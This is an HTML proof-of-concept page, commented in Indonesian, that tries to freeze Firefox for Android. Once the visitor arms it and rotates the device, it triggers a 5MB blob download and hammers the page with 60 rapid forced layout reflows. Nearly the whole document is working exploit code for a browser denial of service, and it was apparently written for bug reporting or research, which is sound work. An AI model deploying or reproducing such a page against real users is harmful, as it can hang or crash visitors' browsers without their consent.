<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FF Android POC v2</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 10px; }
    button { padding: 14px; font-size: 16px; width: 100%; margin: 4px 0; }
    #log { font-size: 11px; border: 1px solid #0f0; padding: 8px; min-height: 120px; margin-top: 8px; }
    .heavy { height: 400vh; background: repeating-linear-gradient(45deg,#1a1a1a,#2a2a2a 8px); }
  </style>
</head>
<body>
<h3>FF Android Freeze POC v2</h3>
<p style="color:yellow;font-size:13px">
  ⚠️ Tap "Arm POC" → lalu <b>putar device</b> secara fisik → freeze akan terjadi saat download + rotasi bersamaan
</p>

<button onclick="armPOC()">🔴 Arm POC (lalu putar device)</button>
<button onclick="triggerDownloadNow()">⬇️ Manual: Trigger Download Saja</button>

<div id="log">Waiting...</div>
<div class="heavy"></div>

<script>
const log = (m) => {
  const d = document.getElementById('log');
  d.innerHTML += `[${(performance.now()|0)}ms] ${m}<br>`;
  d.scrollTop = d.scrollHeight;
};

let armed = false;

// Dengarkan orientasi fisik
window.addEventListener('orientationchange', () => {
  log('[!] orientationchange → ' + (screen.orientation?.type ?? window.orientation));
  if (armed) {
    log('[*] ARMED: memicu download + hammer bersamaan!');
    triggerDownloadNow();
    hammerLayout();
  }
});

window.addEventListener('resize', () => {
  if (armed) {
    log('[resize] ' + window.innerWidth + 'x' + window.innerHeight);
  }
});

function armPOC() {
  armed = true;
  log('[+] POC ARMED — sekarang putar device secara fisik');
  log('[*] Saat kamu rotate, download + reflow akan auto-terpicu');
}

function triggerDownloadNow() {
  // 5MB blob → download bar muncul lebih lama
  const buf = new Uint8Array(5 * 1024 * 1024).fill(65);
  const blob = new Blob([buf], { type: 'application/octet-stream' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'poc.bin';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 5000);
  log('[+] Download 5MB triggered');
}

function hammerLayout() {
  log('[*] Layout hammer: 60 reflows @ 16ms');
  let i = 0;
  const t = setInterval(() => {
    void document.body.getBoundingClientRect();
    document.documentElement.style.fontSize = (14 + (i % 2)) + 'px';
    if (++i >= 60) { clearInterval(t); log('[*] Hammer selesai'); }
  }, 16);
}
</script>
</body>
</html>
